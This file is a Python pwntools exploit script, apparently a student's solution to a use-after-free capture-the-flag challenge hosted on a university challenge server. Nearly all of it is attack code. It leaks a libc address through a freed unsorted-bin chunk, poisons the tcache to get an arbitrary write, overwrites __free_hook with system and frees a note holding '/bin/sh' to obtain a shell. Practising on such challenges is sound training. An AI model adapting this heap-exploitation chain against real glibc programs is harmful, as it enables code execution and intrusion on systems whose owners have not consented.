from pwn import *
from pwnlib.util.packing import *
import re
import struct
import math
import warnings
import time as t
warnings.filterwarnings("ignore") # Had to kill those pwntools ascii warnings...they're annoying

def cleanLine(ln):
	ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	l = ansi_escape.sub('', str(ln, encoding='utf-8'))
	return l

BINARY_FILE = "/home/jnu/Desktop/7-Week/uaf/challenge/chal"
#p = process(BINARY_FILE)

HOST = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 12347
#p = remote(HOST, PORT)

# Array of all of the notes/sizes
NOTES = []

# A function to add a note
#	Input: Process, int representing note size
#	Output: Int representing note pointer
def addNote(p, size):
	n = len(NOTES)
	p.sendline("1")
	print("Adding note " + str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	p.sendline(str(size))
	p.recv()
	p.clean(timeout=0.1)
	NOTES.append(size)
	return(n)


# A function to delete a note
#	Input: Process, Int representing note pointer
#	Output: N/A
def deleteNote(p, n):
	p.sendline("2")
	print("Deleting note " + str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	p.sendline(str(n))
	#p.interactive()
	p.recv()
	p.clean(timeout=0.1)
	return(0)

# A function to read the leaked c address from a note pointer
#	Input: Process, Int representing note number
#	Output: Address near glibc in memory (in decimal notation)
def readAddr(p, n):
	#p.recv()
	p.clean(timeout=0.1)
	p.sendline("4")
	print("Reading address from note " + str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	#p.interactive()
	p.sendline(str(n))
	print(cleanLine(p.recvline()))
	l = p.recv(numb=8)
	lk = hex(unpack(l, 'all', endian='little', sign=False))
	lInt = unpack(l, 'all', endian='little', sign=False)
	print(lk)
	p.recv()
	p.clean(timeout=0.1)
	return(lInt)

# A function that performs the operations to leak an address in libc
#	Input: Process
#	Output: String representing an address near glibc
def leakAddr(p):
	# Add note to fall into unsortedbins
	n = addNote(p, 1033)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)
	
	# Add border note
	addNote(p, 24)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)
	
	# Delete unsortedbins note
	deleteNote(p, n)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)
	
	# Read that note and get the address
	leak = readAddr(p, n)
	print("Leaked Address:")
	print(hex(leak))
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)
	return(leak)


def writeNote(p, n, data):
	p.sendline("3")
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	print("Editing note " + str(n))
	p.sendline(str(n))
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	print("Sending data: " + hex(data))
	p.sendline(p64(data))
	p.recv()
	p.clean(timeout=0.1)
	return(0)



def arbitraryWrite(p, malHook, system):
	# 1) Add two more same size allocations
	n1 = addNote(p, 24)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)
	n0 = n1 - 1 # This points to that "border note"
	n2 = addNote(p, 24)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)

	# 2) Free N1
	deleteNote(p, n1)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)

	# 3) Free N0
	deleteNote(p, n0)
	t.sleep(0.25)
	p.sendline("c")
	print(cleanLine(p.recvline()))
	t.sleep(0.25)

	# 4) Edit note to include overwrite data
	writeNote(p, n0, malHook)
	t.sleep(0.25)
	p.sendline("heap bins tcache")
	p.recvline()
	print(cleanLine(p.recvline()))
	p.sendline("c")
	p.recv()
	p.clean(timeout=0.1)
	t.sleep(0.25)

	# 5) Allocate a new note
	n3 = addNote(p, 24)
	t.sleep(0.25)
	p.sendline("heap bins tcache")
	p.recvline()
	print(cleanLine(p.recvline()))
	p.sendline("c")
	p.recv()
	p.clean(timeout=0.1)
	t.sleep(0.25)

	# 6) One more new note
	n4 = addNote(p, 24)
	t.sleep(0.25)
	p.sendline("heap bins tcache")
	p.recvline()
	print(cleanLine(p.recvline()))
	p.sendline("c")
	p.recv()
	p.clean(timeout=0.1)
	t.sleep(0.25)

	# 7) Final edit of note4 to hold the address of system
	writeNote(p, n4, system)
	t.sleep(0.25)
	#p.recv()
	p.clean(timeout=0.1)

	return 0
	
def pwnTest():
	elf = ELF("./libc-2.31.so")
	p = process('/bin/bash')
	cmd = "gdb " + BINARY_FILE + " -q"
	p.sendline(cmd)
	p.recv()
	p.clean(timeout=0.1)
	p.sendline("break menu")
	print(cleanLine(p.recvline()))
	p.sendline("r")
	p.recv()
	p.clean(timeout=0.05)
	p.sendline("c")
	p.recv()
	p.clean(timeout=0.05)

	leak = leakAddr(p)

	libc = leak - 0x1ECBE0
	print("LibC Base Address:")
	print(hex(libc))


	#system = libc + 0xe3afe
	system = libc + elf.symbols['system']
	#system = libc + 0xe3b01
	#system = libc + 0xe3b04
	print("System address?")
	print(hex(system))
	
	

	malHook = libc + elf.symbols['__free_hook']
	print("Malloc address?")
	print(hex(malHook))

	gadget = libc + 0xef194

	#payload = p64(gadget) + p64(0x0) + p64(system)

	binsh = libc + 0x1b45bd
	print("BinSh pointer?:")
	print(hex(binsh))

	array = libc - 0x2AAAA286AFA0

	arbitraryWrite(p, malHook, system)
	#arbitraryWrite(p, malHook, payload)
	p.sendline("break *0x0000555555555416")
	p.sendline("c")
	p.interactive()
	p.recv()
	p.clean(timeout=0.05)



	#bs = p64(0x2F62696E2F7368)
	bs = 0x2F62696E2F7368
	#bs = 13337528865092456
	n = addNote(p, 24)
	writeNote(p, n, bs)
	p.sendline("c")
	p.recv()
	p.clean(timeout=0.05)

	#deleteNote(p, malHook)
	p.sendline("2")
	print("Deleting note")
	t.sleep(0.25)
	print(cleanLine(p.recvline()))
	p.sendline(str(n))
	p.interactive()
	p.recv()
	p.clean(timeout=0.1)
	p.interactive()
	# So now time to overwrite the malloc hook
	# Currently have note1 still, so this will probably use notes 1 2 and 3


pwnTest()
